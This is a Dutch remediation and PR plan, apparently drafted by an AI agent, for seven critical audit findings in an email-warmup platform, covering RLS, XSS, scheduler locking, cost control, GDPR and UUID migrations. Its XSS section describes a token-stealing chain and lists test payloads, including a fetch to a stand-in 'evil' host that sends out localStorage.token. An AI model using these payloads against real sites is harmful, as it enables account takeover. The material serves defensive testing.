# Warmr — Critical Fix: Implementatie- & PR-plan

**Datum:** 2026-07-09
**Basis:** `WARMR_ENTERPRISE_AUDIT_2026-07.md` (totaalscore 3,9/10)
**Doel:** de 7 Criticals oplossen → minimaal 6,5/10.
**Methode:** elke wijziging is geverifieerd tegen de echte code met `file:line`; zes specialisten hebben de patches, migraties en tests opgesteld. Geen aannames — waar een aanname van de audit onjuist bleek, staat de correctie hieronder.

---

## 0. Status van de working tree (LEES DIT EERST)

Tijdens het opstellen zijn de fixes voor **Critical 5 + 6** al **op de working tree toegepast en getest** (niet gecommit, niet gepusht). De rest is *review-then-apply*. Exact:

| Critical | Toestand op schijf | Actie vereist |
|---|---|---|
| **5 — Scheduler safety** | ✅ **Toegepast** (9 bestanden gewijzigd) + nieuwe `utils/job_lock.py`, migratie `api/critical5_critical6_migration.sql`, `tests/test_scheduler_safety.py`. **205/205 tests groen.** | SQL-migratie draaien; `bash install_launchd.sh` opnieuw uitvoeren; n8n/cron-duplicaten uitzetten |
| **6 — Cost control** | ✅ **Toegepast** (`warmup_templates.py`, `utils/cost_tracker.py`, `warmup_engine.py`, `tests/test_cost_control.py`) | SQL-migratie draaien (zelfde bestand als 5) |
| **1 — RLS** | 🟡 **Bestanden geschreven** (`api/rls_hardening_migration.sql`, `tests/test_rls_hardening.py`) maar **migratie nog niet gedraaid** | Migratie draaien op een Supabase-branch, dan prod |
| **2 — XSS** | ⚪ **Patch klaar** (niet toegepast) — zie §4 | Patches toepassen + `frontend/safe-dom.js` aanmaken |
| **3 — Promotie/Heater** | ⚪ **Patch klaar** (niet toegepast) — zie §5 | Patches toepassen + migratie |
| **4 — Cascade-FK/UUID** | ⚪ **Gefaseerd plan** (niet toegepast) — zie §6 | Phase 0 code nu, DB-migratie in onderhoudsvenster |
| **7 — GDPR** | ⚪ **Patch klaar** (niet toegepast) — zie §9 | Nieuwe modules + migratie |

> **Beslissing aan jou:** de toegepaste 5+6-wijzigingen zijn volledig reversibel (`git checkout -- <bestand>` / verwijder de nieuwe bestanden). Wil je álles uniform via PR-review laten lopen, dan draai ik 5+6 terug tot patch-vorm. Anders review je de diff (`git diff`) en houd je ze.
> `git diff --stat`: `api/main.py, bounce_handler.py, campaign_scheduler.py, daily_reset.py, imap_processor.py, install_launchd.sh, tests/run_all.py, utils/cost_tracker.py, warmup_engine.py` — 287 insertions, 49 deletions.

---

## 1. Executive implementation summary

### Volgorde (welke fixes eerst)
De volgorde volgt **risico-om-te-fixen vs. blast-radius**, niet de nummering van de audit:

1. **XSS (C2)** en **RLS (C1)** eerst: hoogste ernst (account-overname / cross-tenant-lek), volledig standalone, lage regressiekans. Puur frontend + één DB-migratie.
2. **Scheduler safety (C5)**: de uurlijkse `daily_reset` en drievoudige scheduler verbranden *nu* reputatie en geld — direct dichten.
3. **Cost control (C6)**: stopt de €200k/maand-koers; laag risico.
4. **GDPR (C7)**: reply-unsubscribe (~15 regels, hoogste compliance-per-effort) + volledige client-delete + retentie.
5. **Promotie/Heater (C3)**: belangrijk maar geen leak/veiligheid; vereist Heater-coördinatie.
6. **Cascade-FK/UUID (C4)**: het gevaarlijkst, als laatste, in een onderhoudsvenster met PITR.

### Welke fixes elkaar blokkeren
- **C3** brengt een eigen migratie mee (`webhook_events.idempotency_key`). Geen externe blokkade.
- **C4 (UUID)** moet de RLS-policies **herschrijven** die **C1** introduceert (`= auth.uid()::text` → `= auth.uid()`). → **C4 komt ná C1** en past C1's policies aan.
- **C7's volledige client-delete is code-gebaseerd** en heeft **C4 niet nodig** — daarom kan de GDPR-erasure meteen (C7 Phase A), en de DB-cascade (C4) volgt later als defense-in-depth. Dit haalt de gevaarlijkste migratie van het kritieke pad.
- **C6 maintenance-mode** en **C3 promotie** raken beide `auto_promote`/`warmup_engine` — coördineer (beide lezen `status='ready'`); geen harde blokkade.

### Gedeelde bestanden (let op bij toepassen)
- **`daily_reset.py`** krijgt 3 onafhankelijke toevoegingen: date-guard (C5, al toegepast), `refresh_inbox_reply_rates`-aanroep (C3), en staat naast de nieuwe `retention_engine.py` (C7).
- **`admin_delete_client`** wordt door twee agents herschreven (C4 Phase 0 en C7). **Canoniek = C7's versie** (`utils/tenant_purge.delete_all_client_data`); C4's inline-variant vervalt.
- **`install_launchd.sh`** krijgt drie nieuwe plists: `promotion-sweep` (C3), `retention-engine` (C7), plus de daily-reset kalender-fix (C5, al toegepast).
- **`webhook_events`** wordt door C1 (RLS aan + REVOKE) en C3 (idempotency_key) geraakt — compatibel: service_role bypasst RLS, dus de emit-insert blijft werken.

### Vereiste database-migraties (in deze volgorde per PR)
1. `api/rls_hardening_migration.sql` (C1)
2. `api/critical5_critical6_migration.sql` (C5+C6) — **al aanwezig**
3. `api/webhook_events_idempotency_migration.sql` (C3)
4. `api/gdpr_retention_migration.sql` (C7)
5. `api/client_id_uuid_migration.sql` (C4) — onderhoudsvenster, PITR eerst

### Risico's bij productie-uitrol
- **RLS (C1):** breekt niets *mits* geen frontend-pad de 8 tabellen via de anon-key leest — dit is **geverifieerd niet het geval** (frontend heeft nul referenties). Draai toch eerst op een Supabase-branch.
- **UUID (C4):** `ALTER COLUMN TYPE` herschrijft tabellen onder `ACCESS EXCLUSIVE` → onderhoudsvenster; `email_tracking` (enige high-volume tabel met client_id) via online add-column/backfill/swap. PITR = de echte rollback.
- **Single-scheduler (C5):** zet je de verkeerde scheduler uit, dan stoppen jobs. Mitigatie: de advisory-lock maakt dubbeldraaien onschadelijk → zet die **eerst** aan, consolideer daarna.
- **Volledige client-delete (C7):** nu écht destructief (30+ tabellen i.p.v. ~4). Test tegen een wegwerp-tenant; overweeg een `?dry_run=1`.
- **Maintenance-mode (C6):** risico dat warmup stopt op inboxen die het nog nodig hebben → gated op `status='ready'`/`warmup_mode`.

---

## 2. PR-reeks

> Splitsing is bewust klein en onafhankelijk. PR 3 en PR 4 zijn in de working tree samen toegepast (delen één migratie), maar blijven logisch gescheiden.

### PR 1 — Stop the bleeding: XSS (Critical 2)
- **Doel:** de zero-click stored XSS elimineren (Phase A: alle untrusted output escapen).
- **Bestanden:** nieuw `frontend/safe-dom.js`; patches in `frontend/{app.js, unified-inbox.html, dashboard.html, leads.html, suppression.html, campaigns.html, admin.html, inboxes.html, decisions.html, experiments.html}`; `<script src="safe-dom.js">` toegevoegd op alle 17 pagina's; (Phase B, apart) CSP `script-src` zonder `'unsafe-inline'` in `api/main.py:128`.
- **Migraties:** geen.
- **Tests:** `tests/test_xss_rendering.mjs` (Node `vm`), `tests/test_xss_rendering.py` (regressie-guard).
- **Rollback:** additief; verwijder `safe-dom.js`-include; patches zijn pure `x`→`escapeHtml(x)`-wraps.
- **Risico:** laag (alleen presentatie). Enige gedragswijziging: `stopSequence(id, email)` → `stopSequence(id)`.
- **Complexiteit:** M (Phase A klein/mechanisch; Phase B = groot inline-handler-refactor, apart).

### PR 2 — Close the tenant leak: RLS (Critical 1)
- **Doel:** RLS aan + `REVOKE` op de 8 lekkende tabellen.
- **Bestanden:** `api/rls_hardening_migration.sql` (al geschreven), `full_schema.sql` (canoniek bijwerken).
- **Migraties:** `api/rls_hardening_migration.sql`.
- **Tests:** `tests/test_rls_hardening.py` (al geschreven) — cross-tenant read/write geblokkeerd per tabel.
- **Rollback:** `rollback_rls_hardening.sql` (in §3).
- **Risico:** laag — geverifieerd dat geen frontend-pad deze tabellen via anon-key leest.
- **Complexiteit:** S.

### PR 3 — Scheduler safety (Critical 5) — *toegepast in tree*
- **Doel:** dubbel/drievoudig verzenden onmogelijk maken; uurlijkse cap-reset dichten; sends idempotent.
- **Bestanden:** nieuw `utils/job_lock.py`; patches `warmup_engine.py`, `imap_processor.py`, `campaign_scheduler.py`, `bounce_handler.py`, `daily_reset.py`, `api/main.py` (TypeError-fix), `install_launchd.sh`.
- **Migraties:** `api/critical5_critical6_migration.sql` (job_locks, `try_acquire_job_lock`, `increment_daily_sent`, `last_reset_date`, `email_events_sent_once_idx`).
- **Tests:** `tests/test_scheduler_safety.py` (5).
- **Rollback:** `git checkout -- <bestanden>`; migratie is additief (`DROP FUNCTION/TABLE/INDEX/COLUMN IF EXISTS`).
- **Risico:** M — één scheduler kiezen; lock maakt overlap onschadelijk tijdens migratie.
- **Complexiteit:** L.

### PR 4 — Cost control (Critical 6) — *toegepast in tree*
- **Doel:** LLM-kosten kwadratisch → lineair-begrensd; warmup stopt na READY.
- **Bestanden:** nieuw `warmup_templates.py`; patches `utils/cost_tracker.py`, `warmup_engine.py`.
- **Migraties:** `get_daily_api_spend`-RPC, `inboxes.warmup_mode` (in het C5+C6-migratiebestand).
- **Tests:** `tests/test_cost_control.py` (5).
- **Rollback:** `git checkout`; migratie additief.
- **Risico:** M — maintenance-mode gated op READY; template-bank + spintax kan deliverability raken → sampling behouden.
- **Complexiteit:** M.

### PR 5 — GDPR fundamentals (Critical 7)
- **Doel:** reply-unsubscribe→suppressie; volledige client-delete; retentie; audit; log-masking.
- **Bestanden:** nieuw `utils/suppression.py`, `utils/tenant_purge.py`, `utils/audit.py`, `retention_engine.py`; patches `imap_processor.py`, `campaign_scheduler.py`, `api/main.py`, `utils/structured_logging.py`, `install_launchd.sh`.
- **Migraties:** `api/gdpr_retention_migration.sql` (`clients.closed_at`, `client_settings.retention_days`, `reply_inbox.retention_hold`, indexen).
- **Tests:** `tests/test_gdpr_fixes.py` (7).
- **Rollback:** nieuwe bestanden verwijderen; migratie `DROP COLUMN IF EXISTS`; patches zelf-bevattend.
- **Risico:** M — `admin_delete_client` nu écht destructief → dry-run tegen test-tenant.
- **Complexiteit:** L.

### PR 6 — Promotie-lifecycle + Heater-event (Critical 3)
- **Doel:** mailboxen promoveren automatisch naar READY; `inbox.warmup_complete` bereikt Heater; geen dubbele promotie.
- **Bestanden:** patches `auto_promote.py`, `api/public_api.py`, `imap_processor.py`; nieuw `promotion_sweep.py`; `daily_reset.py` (reply_rate-writer); `install_launchd.sh`.
- **Migraties:** `api/webhook_events_idempotency_migration.sql`.
- **Tests:** `tests/test_promotion_lifecycle.py` (4) + patch `tests/test_auto_promote.py` (mock).
- **Rollback:** patches reverten; `promotion_sweep.py` verwijderen; migratie additief.
- **Risico:** M — **blocker: `inboxes.reply_rate` heeft geen writer** (zie §5); zonder de writer blokkeert élke promotie.
- **Complexiteit:** L.

### PR 7 — Referentiële integriteit: client_id → UUID + cascade-FK's (Critical 4)
- **Doel:** echte `ON DELETE CASCADE` van client → data (defense-in-depth bovenop PR 5).
- **Bestanden:** `api/client_id_uuid_migration.sql`; herschrijft de RLS-policies uit PR 2 (`::text` weg); `full_schema.sql` canoniek.
- **Migraties:** de UUID-conversie (28 tabellen) + child-FK-cascades (8) + 28 client-FK's.
- **Tests:** `tests/test_client_delete_cascade.py`.
- **Rollback:** PITR-restore-point vóór het venster (de echte rollback); per-fase revert in §6.
- **Risico:** **Hoog** — tabel-rewrites onder `ACCESS EXCLUSIVE`; onderhoudsvenster; PITR eerst.
- **Complexiteit:** XL.

---

## 3. Critical 1 — RLS op 8 lekkende tabellen

**Geverifieerd:** alle 8 tabellen worden **uitsluitend** door service-role-backends benaderd; de frontend (anon-key, `app.js:19`) heeft **nul** referenties. `unsubscribe_tokens` wordt server-side/service-role bediend (`main.py:5962-6003`) — dus RLS+REVOKE is veilig zonder SECURITY DEFINER RPC.

**Beslissingsmatrix:**

| Tabel | client_id | Isolatie | Aanbeveling |
|---|---|---|---|
| webhook_logs | direct (TEXT, nullable) | `client_id` | RLS + REVOKE + slapende `FOR SELECT` policy |
| webhook_events | direct (TEXT NOT NULL, PII-payload) | `client_id` | RLS + **REVOKE-only** (outbox-queue) |
| warmup_network_accounts | direct (nullable, NULL=shared) | `client_id` | RLS + **REVOKE-only** (policy matcht NULL niet) |
| network_health_log | direct (nullable) | `client_id` | RLS + REVOKE + slapende `FOR SELECT` |
| placement_test_results | via `placement_tests.client_id` | parent-subquery | RLS + REVOKE + slapende parent-`FOR SELECT` |
| dns_check_log | via `domains.client_id` | parent-subquery | RLS + REVOKE + slapende parent-`FOR SELECT` |
| blacklist_recoveries | via `domains.client_id` | parent-subquery | RLS + REVOKE + slapende parent-`FOR SELECT` |
| unsubscribe_tokens | direct (TEXT NOT NULL) | `client_id` | RLS + **REVOKE-only** (bearer-token mag niet listbaar) |

**Migratie:** `api/rls_hardening_migration.sql` (reeds geschreven) — idempotent, per tabel `ENABLE ROW LEVEL SECURITY` + `REVOKE ALL … FROM anon, authenticated` + `GRANT ALL … TO service_role` + `DROP POLICY IF EXISTS`/`CREATE POLICY` voor de 5 policy-dragende tabellen, met een verificatieblok. Load-bearing regel is de `REVOKE` (verwijdert Supabase's default-grants — de eigenlijke lek-vector). De policies zijn defense-in-depth (slapend achter de REVOKE).

**Tests:** `tests/test_rls_hardening.py` (reeds geschreven) — hergebruikt de two-tenant-harness van `test_rls_isolation.py`; per tabel: tenant A kan B's rij niet SELECTen (ook niet via `select=*`-scan) en niet INSERTen met B's `client_id`. Assertions accepteren `401/403` (REVOKE) óf lege `200` (policy).

**Rollback:** zie het `rollback_rls_hardening.sql`-blok (RLS uit + grants terug — herstelt bewust de kwetsbare staat; alleen voor een slechte deploy).

**Risico:** geen frontend-breuk (geverifieerd). Service-role bypasst RLS, dus RLS backstopt géén ontbrekende `.eq("client_id")` in endpoints — aparte zorg (audit §10), buiten scope.

---

## 4. Critical 2 — Zero-click stored XSS

**Geverifieerde taint-chain:** `/notifications/poll` (`main.py:2770` selecteert `from_email, subject`) → `app.js:_pollNotifications` (elke 30s, `:394-399`) bouwt de melding → `toast()` `innerHTML` (`app.js:139-145`). CSP `script-src 'unsafe-inline'` (`main.py:128`) mitigeert niet; token in `localStorage` → exfiltratie **zonder klik**.

**Helper-reconciliatie:** `funnel.html`/`campaign-performance.html` hebben een **complete** `escapeHtml` (behouden); `unified-inbox.html:515` heeft een **incomplete** globale `escapeHtml` (geen quotes) die de canonieke schaduwt → **verwijderen**; `campaign-performance`-stijl wordt canoniek via een nieuw `frontend/safe-dom.js` (geladen vóór `config.js` op alle 17 pagina's — let op: `decisions.html`/`experiments.html` laden géén `app.js`).

**`frontend/safe-dom.js` (nieuw):** globale `escapeHtml` (5 entiteiten: `& < > " '`, null-safe), `safeText(el,s)` (textContent), `safeAttr`, `safeHtml` (escape + `\n`→`<br>`), met een `if (typeof w.escapeHtml !== 'function')`-guard zodat de complete bestaande definities winnen.

**Kern-sink-patches (untrusted data):**
- `app.js` `toast()`: message via `safeText(el.querySelector('.toast-msg'), message)` i.p.v. `${message}` in `innerHTML`. `toastWithUndo()`: `escapeHtml(message)` + `escapeHtml(undoLabel)`.
- `unified-inbox.html`: `escapeHtml(...)` rond `name`, `company`, `r.subject`, `campName`, `fullName`, `sender`, `initials` in `renderReplyItem`/`renderDetail`/sidebar; **onclick-fix** `stopSequence('${r.id}','${sender}')` → `stopSequence('${r.id}')` (email intern opgezocht) — dicht de attribuut-context-breakout; incomplete `escapeHtml:515` verwijderen.
- `dashboard.html` (`ev.message`, `n.message`, `c.name` in title+text, inbox email/domain), `leads.html` (naam/email/company/opener/positioning/`enrichItem`/`_reasons`-title), `suppression.html` (email/domein/reason/source), `campaigns.html` (`_esc` upgraden tot 5 entiteiten + CSV-header/cel escapen + `data-header` i.p.v. inline-onclick-injectie), `admin.html` (client email/company — **privilege-escalatie-XSS in de adminconsole**), `inboxes.html` (email/domain/counterpart), `decisions.html` (entity_name/reason), `experiments.html` (name/hypothesis).

**CSP (gefaseerd):** **Phase A** = alleen escapen (dood de XSS, CSP ongewijzigd). **Phase B** = `'unsafe-inline'` uit `script-src` (defense-in-depth) — vereist eerst ~340 inline-handlers → `addEventListener`/event-delegation en 17 inline `<script>`-blokken → externe `.js`. `style-src 'unsafe-inline'` **behouden** (pervasief inline `style=`; geen script-executie). `object-src 'none'` toevoegen. localStorage→cookie = aparte architectuur-ticket.

**Tests:** geen JS-runner in de repo → (A) `tests/test_xss_rendering.mjs` laadt de echte `safe-dom.js` via `node:vm` en assert de payloads; (B) `tests/test_xss_rendering.py` grep-regressie-guard (sinks gewrapt, incomplete helpers weg, `safe-dom.js` vóór `app.js`).

Payload-tabel:

| Input | Verwacht (geëscaped) |
|---|---|
| `<img src=x onerror=alert(1)>` | `&lt;img src=x onerror=alert(1)&gt;` |
| `"><svg onload=alert(1)>` | `&quot;&gt;&lt;svg onload=alert(1)&gt;` |
| `javascript:alert(1)` | `javascript:alert(1)` (inert als tekst) |
| `x'),fetch('//evil?t='+localStorage.token)//` | `x&#39;),fetch(&#39;//evil?t=&#39;+localStorage.token)//` |

---

## 5. Critical 3 — Promotie naar READY + Heater-event

**⚠ Nieuw ontdekte blocker:** `inboxes.reply_rate` heeft **geen writer** (kolom `DEFAULT 0`; niets schrijft ernaar). De audit eist het `reply_rate≥0.25`-criterium — maar zonder writer leest elke inbox `0.0` → **élke promotie faalt op `low_reply_rate`**. **Oplossing:** `refresh_inbox_reply_rates(sb)` (recompute `replied/sent` uit `warmup_logs`) toevoegen aan `daily_reset.main()`. Verifieer de `warmup_logs.action`-waarden (`'sent'`/`'replied'`) tegen `warmup_engine.py` vóór uitrol. **Ship de writer samen met het criterium.**

**`auto_promote.py`:**
- `_evaluate_criteria`: `int(reputation_score)` → `float(...)` (69,8 werd 69 → onterecht geweigerd); voeg `reply_rate` toe.
- `_decline_reason`: nieuw `low_reply_rate` als laatste (bestaande orderingen ongewijzigd).
- `check_and_promote_inbox`: **conditionele** update `.eq("id",id).eq("status","warmup")`; 0 rijen → `{"promoted":False,"reason":"already_promoted"}` (dicht TOCTOU/dubbele activatie); bij succes `_emit_warmup_complete(...)`.
- `_emit_warmup_complete`: insert in `webhook_events` (`{client_id, event_type:"inbox.warmup_complete", payload, dispatched:False, idempotency_key, created_at}`); key = `f"inbox.warmup_complete:{inbox_id}:{promoted_at}"`; nooit raise.

**`api/public_api.py` `VALID_EVENTS`:** `inbox.warmup_complete` bestaat al (`:73`); voeg `inbox.paused`, `inbox.retired` toe.

**Migratie `api/webhook_events_idempotency_migration.sql`:** `ADD COLUMN IF NOT EXISTS idempotency_key TEXT` + partiële unique index `(client_id, event_type, idempotency_key) WHERE idempotency_key IS NOT NULL` (legacy lead.*-emitters zetten geen key → NULL toegestaan).

**`imap_processor.py`:** `from auto_promote import check_and_promote_inbox`; `maybe_promote_inbox(sb, inbox, prev_score, new_score)` — guard: alleen `status=='warmup'` én de delta **kruist** de drempel omhoog (`prev < 70 <= new`), zodat het niet elke cyclus draait; aangeroepen na `update_reputation` in beide paden (warmup-netwerk + spam-rescue).

**`promotion_sweep.py` (nieuw):** backstop die alle `warmup`-inboxen elk uur evalueert (tijd-gebaseerde criteria worden hier gevangen); idempotent (conditionele update = 0-rij no-op). `install_launchd.sh`: `make_plist "promotion-sweep" "promotion_sweep.py" 3600`.

**Tests:** `tests/test_promotion_lifecycle.py` — (1) concurrent dubbele promotie → precies één promotie + één event; (2) event draagt idempotency_key; (3) `reply_rate<0.25` blokkeert; (4) already-ready = no-op. Plus mock-patch in `tests/test_auto_promote.py` (multi-`.eq`, `.insert`, status-guard, `reply_rate` in baseline).

**Toepasvolgorde:** migratie eerst; dan `auto_promote`+`public_api`; dan `imap_processor`+`promotion_sweep`+launchd; dan de reply_rate-writer; dan tests.

**Risico:** at-least-once dispatcher → Heater dedupt op `idempotency_key`; conditionele update + partiële unique index verhinderen dubbele emit. Re-promotie na degradatie krijgt nieuwe timestamp → nieuw event (bewust). **Buiten scope (audit §4.4):** pause/resume-writes zijn nog niet conditioneel — een pause die met promotie racet kan nog last-write-winnen; volg op met de centrale `transition_inbox()`.

---

## 6. Critical 4 — client_id TEXT↔UUID + cascade-FK's

**Geverifieerd:** 9 FK's in `tenancy_hardening_migration.sql` (`:15-114`), elk in `EXCEPTION WHEN OTHERS THEN NULL` → geen enkele wordt aangemaakt (TEXT refereert UUID = `42804`). 28 tabellen hebben `client_id TEXT`; `clients.id` is UUID. De app schrijft altijd de UUID-string (`auth.py:9,152`) → `::uuid`-cast veilig; geen Python-wijziging nodig.

**Twee verborgen blockers (miste de audit):**
1. Zelfs met correcte 9 FK's faalt de cascade omdat 8 **intermediate child-FK's** `NO ACTION` zijn (`warmup_logs.inbox_id`, `bounce_log.inbox_id`, `sending_schedule.inbox_id`, `email_events.{campaign,lead,inbox}_id`, `reply_inbox.{campaign,lead,inbox}_id`) → `23503` mid-cascade. **Moeten óók `ON DELETE CASCADE` worden.**
2. `admin_delete_client` filtert `warmup_logs`/`bounce_log` op `client_id` — **die kolom bestaat daar niet** → error, geslikt (koppelt aan C7).

**Aanbeveling: Optie A (UUID-eindstaat), gefaseerd, met Optie B2's code-fix als Phase 0.**

- **Phase 0 (nu, online, geen DDL):** volledige `admin_delete_client` in code — **canoniek = C7's `utils/tenant_purge.delete_all_client_data`** (zie §9). Sluit de GDPR-wees-gap direct.
- **Phase 1 (read-only):** data-audit — per tabel tellen: `client_id IS NULL`, `!~ UUID-regex`, en valid-UUID-zonder-client (orphan). Plus view/matview-dependency-check en row-counts (sizing).
- **Phase 2 (online, batched, met `_premig_quarantine_*`-snapshot):** remediatie van NULL/invalid/orphan `client_id` (backfill bekende slugs; quarantine+delete onherleidbare PII).
- **Phase 3A (venster, één transactie):** drop alle isolatie-policies → `ALTER COLUMN client_id TYPE uuid USING client_id::uuid` per tabel → 8 child-FK's naar CASCADE → 28 client-FK's `ADD … NOT VALID` (kort ACCESS EXCLUSIVE, catalog-only) → policies herstellen met `auth.uid()` + `WITH CHECK`.
- **Phase 3B (alleen `email_tracking` als groot):** online add-column/backfill-in-batches/short-swap.
- **Phase 6.2 (online):** `VALIDATE CONSTRAINT` per FK (SHARE UPDATE EXCLUSIVE).
- **Phase 4 (verificatie):** `SELECT conname … WHERE conname LIKE 'fk_%client%'` → 28 rijen, `on_delete=CASCADE` (`api_cost_log`=SET NULL), `convalidated=true`; geen `client_id TEXT` meer; geen orphans; geen `::text`-policy meer.
- **Phase 5 (rollback):** **PITR-restore-point / Supabase-branch vóór Phase 3** = de echte rollback; `uuid::text` is lossless terug.

**Test:** `tests/test_client_delete_cascade.py` — seed één rij per client_id-tabel + parent-geïsoleerde logs, verwijder de `clients`-rij, assert nul rijen overal (faalt vóór de migratie, slaagt erna).

**Koppeling met C1:** Phase 3A herschrijft precies de policies die PR 2 aanmaakte (`::text` → `auth.uid()`) — daarom **C4 ná C1**.

---

## 7. Critical 5 — Scheduler safety *(toegepast in tree)*

**Geverifieerd:** drievoudige overlap (cron + launchd + n8n) voor 5 jobs; nul bestaande locking; de `campaign_scheduler.main(client_id=…)`-TypeError (`main.py:1510` vs `def main()` op `:1143`) maakte het n8n-campagnepad een stille no-op. Drie audit-aannames gecorrigeerd: RPC-arg heet **`inbox_uuid`** (niet `p_inbox`); `email_events` heeft **geen** `campaign_lead_id`/`sequence_step` (wel `campaign_id, lead_id, sequence_step_id`); een session-`pg_try_advisory_lock` via PostgREST is **onbetrouwbaar** (stateless pooled HTTP) → **lease-row-lock** gebruikt.

**Wijzigingen:**
- `utils/job_lock.py` (nieuw): `job_lock(job_key)` context-manager, `job_locks`-lease-rij via `try_acquire_job_lock`-RPC; **fail-open** bij DB-storing (atomaire claim + increment-RPC zijn de tweede verdedigingslinie); owner = `hostname:pid:uuid`. Om elke `main()` gewikkeld (warmup/imap/campaign/bounce/daily_reset), publieke namen behouden zodat `api/main.py`-runners blijven resolven.
- `daily_reset.py`: date-guard `.or_("last_reset_date.is.null,last_reset_date.neq.{today}")` (NULL-safe) i.p.v. onvoorwaardelijke `daily_sent=0`; launchd → `StartCalendarInterval` 00:05 i.p.v. `StartInterval 3600`.
- Atomaire send-claim: `UPDATE campaign_leads SET status='sending' WHERE id=? AND status='active' RETURNING *` — alleen de winnaar verzendt; non-finale stap heropent (`completed if completed else active`); SMTP-fail revert `sending→active`.
- `increment_daily_sent(inbox_uuid uuid)`-RPC (matcht `warmup_engine.py:188`).
- Idempotency-index `email_events_sent_once_idx ON email_events (campaign_id, lead_id, sequence_step_id) WHERE event_type='sent'`.
- Single-scheduler: launchd behouden; n8n-duplicaten uit; `crontab_warmr.sh` niet op launchd-hosts; campaign_scheduler aan `install_launchd.sh` toevoegen; TypeError gefixt.

**Migratie:** `api/critical5_critical6_migration.sql` (job_locks, RPC's, kolommen, index) — **eerst draaien**. Code faalt veilig als hij vóór de migratie draait (lock fail-open; spend-RPC valt terug op scan).
**Tests:** `tests/test_scheduler_safety.py` (5). **Suite: 205/205.**

---

## 8. Critical 6 — Cost control *(toegepast in tree)*

- **`get_daily_spend`** (`utils/cost_tracker.py:79-88`): full-scan+Python-sum → `get_daily_api_spend(p_client)`-RPC (Postgres `SUM`, gebruikt `idx_api_cost_log_client_date`); oude scan alleen als pre-migratie-fallback.
- **Maintenance-mode:** `inboxes.warmup_mode TEXT DEFAULT 'full'` (`full|maintenance|off`), backfill `ready→'maintenance'`. `warmup_engine.process_inbox`: `off`→skip; `maintenance`/`status=='ready'`→cap op `MAINTENANCE_WARMUP_TARGET` (env, default 5) + `force_template=True` → **nul live LLM** voor gegradueerde inboxen. (Dicht de €200k/maand-koers: warmup stopt niet meer eeuwig op volle volume.)
- **Template-bank:** `warmup_templates.py` (nieuw) — per taal (`nl/en/fr`) subject+body-spintax via `spintax_engine.process_spintax`; namen substitueren vóór spinnen (anders eet spintax `{sender}`). `generate_email_content` default templates; alleen `WARMUP_LLM_SAMPLE_PCT` (env, default 10%) via live model.
- **Budget-failover:** `BudgetExceededError` (`cost_tracker.py:200`) degradeert nu naar een template i.p.v. de send af te breken; IMAP-reply-paden (`:915`, `:1103`) wrappen al in try/except → budget-uitputting slaat een reply over, crasht niet.

**Tests:** `tests/test_cost_control.py` (5) — budget-exceeded → template (geen exception, mail geproduceerd, naam gesubstitueerd, geen braces); 0%-sample roept model nooit; `get_daily_spend` gebruikt de aggregaat-RPC, geen scan.

---

## 9. Critical 7 — GDPR fundamentals

**Geverifieerd:** `admin_delete_client` (`main.py:3561`) wist 7 tabellen en filtert `warmup_logs`/`bounce_log` op een **niet-bestaande** `client_id` (error geslikt); 28 client_id-tabellen + FK-only-children blijven wees. Reply-unsubscribe (`imap_processor.py:766-776`) zet alleen `leads.status`, geen suppressie/cancel. `is_suppressed` (`campaign_scheduler.py:109-119`) is email-only. `retention_policy` (`main.py:4864`) is een hardcoded onwaarheid; geen retentie-job, geen `clients.closed_at`.
> **Caveat (niet-verifieerbaar van hieruit):** `email_events` heeft **geen** `client_id` in het schema, maar `compliance_overview` en de events-CSV filteren erop → stille lege reads/latente bug. De delete/retentie hieronder **vermijden** afhankelijkheid van die kolom (join via `campaign_id`/`lead_id`). Verifieer de live kolom apart.

**Wijzigingen:**
- **`utils/suppression.py` (nieuw):** `suppress_and_cancel(sb, client_id, lead_email, lead_id, reason, source)` — suppressie-rij (idempotent via `UNIQUE(client_id,email)`) + cancel actieve `campaign_leads` + `sending_schedule`. Aangeroepen vanuit `imap_processor` bij `cat=="unsubscribe"` en (optioneel) `process_unsubscribe`.
- **`is_suppressed`** (`campaign_scheduler.py`): ook domein-match (mirror import-gate `main.py:2653`) — twee geïndexeerde point-lookups.
- **`utils/tenant_purge.py` (nieuw):** `delete_all_client_data(sb, client_id)` — children-first over alle 28 client_id-tabellen + FK-only-children (`email_events` via campaign/lead, `warmup_logs`/`bounce_log` via inbox, etc.); empty-`.in_()`-guard; per-tabel-counts. **`admin_delete_client` delegeert hiernaar + schrijft een audit-rij.** (Dit is de canonieke vervanger van C4 Phase 0.)
- **`retention_engine.py` (nieuw, dagelijks, idempotent):** `email_events` > N dagen (globaal, tijd-gebaseerd — geen client_id); per-client `email_tracking`+`reply_inbox` > `client_settings.retention_days` (reply_inbox skip bij `retention_hold` of `interested/referral`); closed accounts (`closed_at` > 30d) → volledige purge. `install_launchd.sh`: `make_plist "retention-engine" "retention_engine.py" 86400`. `compliance_overview` → `_retention_policy_text(client_id)` die alleen automatische verwijdering claimt als `WARMR_RETENTION_ENABLED=1`.
- **`utils/audit.py` (nieuw):** `write_audit(...)`; `_log_admin_action` delegeert. Audit-inserts op `gdpr_export/purge/erase` + de 5 CSV-exports.
- **Log-masking:** `EmailMaskingFilter` in `structured_logging.py` (regex `\S+@\S+` → `u***@domain`), onvoorwaardelijk aangehecht (ook in plain-text-modus); `RotatingFileHandler`-aanbeveling (launchd-logs roteren nu niet).

**Migratie `api/gdpr_retention_migration.sql`:** `clients.closed_at`, `client_settings.retention_days DEFAULT 365`, `reply_inbox.retention_hold BOOLEAN DEFAULT false`, + indexen (`closed_at`, `email_events.timestamp`, `email_tracking(client_id,created_at)`, `reply_inbox(client_id,received_at)`).

**Tests:** `tests/test_gdpr_fixes.py` (7) — reply-unsubscribe suppresses+cancels (+ idempotent); `is_suppressed` blokkeert domein; volledige delete = nul rijen (andere tenant intact); retentie verwijdert oud/skipt held+interested; audit-rij geschreven.

**Risico:** `admin_delete_client` nu écht destructief → dry-run tegen test-tenant; `_purge_lead_by_id` mist nog `crm_sync_log.lead_id` + leunt op `email_events.client_id` → route via een gedeelde `purge_lead()` (follow-up).

---

## 10. Testplan

| Bestand | Test | Scenario | Verwacht |
|---|---|---|---|
| `tests/test_rls_hardening.py` | `test_secured_tables_block_cross_tenant_read` | Tenant A leest B's rij in elk van de 8 tabellen | 401/403 of lege 200 |
| ″ | `test_secured_tables_block_cross_tenant_write` | Tenant A INSERT met B's client_id | Geweigerd |
| `tests/test_xss_rendering.mjs` | `escapeHtml: *` | 4 payloads (img/onerror, svg/onload, javascript:, quote-break) | Exacte geëscapede output |
| `tests/test_xss_rendering.py` | `test_*_escaped` / `test_safe_dom_loaded_before_app_js` | Sinks gewrapt, incomplete helpers weg, include-volgorde | Groen |
